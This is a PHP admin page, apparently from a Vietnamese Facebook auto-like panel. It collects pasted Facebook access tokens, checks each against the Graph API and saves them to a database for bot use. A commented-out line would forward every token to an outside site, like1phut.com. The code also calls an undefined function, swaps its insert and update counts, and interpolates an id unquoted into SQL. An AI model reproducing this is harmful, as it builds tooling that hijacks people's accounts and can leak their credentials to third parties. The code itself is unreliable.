<?php
include 'system/head.php';
?>
        <div class="content">
            <div class="container-fluid">
                <div class="row">



<div class="card">
    <div class="header">
        <h4 class="title"><i class="fa fa-dashboard" style="margin-right: 5px;"></i> Thêm Token vào Hệ Thống </h4>
        <p class="category">Sử Dụng Token Iphone Để hệ thống hoạt Động</p>
    </div>
<div class="content">     
<form method="post">
  <div class="form-group">
    <label for="info">Nhập Token IPhone: (Cách nhau = Xuống Dòng)</label>
    <textarea name="token" class="form-control" rows="10"></textarea>
  </div>
  <button type="submit" class="btn btn-success">Thêm Token</button>
</form>

</div></div>

<?php


if($_POST['token']){


set_time_limit(0);
$token = $_POST['token'];
$insert = $update = 0;
$data  = explode("\n", $token);
foreach ($data as $token) {
   $me = cek(trim($token));

   if ($me['id']) {
      if (mysqli_num_rows(mysqli_query($GLOBALS["___BMN_2312"], "SELECT `name` FROM token WHERE user_id = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $me['id']) . "'"))) {
         mysqli_query($GLOBALS["___BMN_2312"], "UPDATE token SET `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "' WHERE `user_id` = " . $me['id'] . "");
         ++$insert;
      } else {
         mysqli_query($GLOBALS["___BMN_2312"], "INSERT INTO token SET
               `user_id` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $me['id']) . "',
               `name` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $me['name']) . "',
               `access_token` = '" . mysqli_real_escape_string($GLOBALS["___BMN_2312"], $token) . "'
         ");
         //auto('http://like1phut.com/check.php?puaru='.$token);
         ++$update;
      }
   }
}

echo '<div class="list-group-item"> Đã Thêm <b style="color:#f00">' . $insert . '</b> Tài Khoản</div>';
echo '<div class="list-group-item"> Đã Cập Nhật <b style="color:#f00">' . $update . '</b> Tài Khoản</div>';

}

function cek($o) {
   return json_decode(auto('https://graph.facebook.com/me?access_token='.$o),true);
}

function trien($url) {
   $ch = curl_init();
   curl_setopt_array($ch, array(
      CURLOPT_CONNECTTIMEOUT => 5,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_URL            => $url,
      )
   );
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
}
echo '</div></div></div>';
include 'system/foot.php';
?> 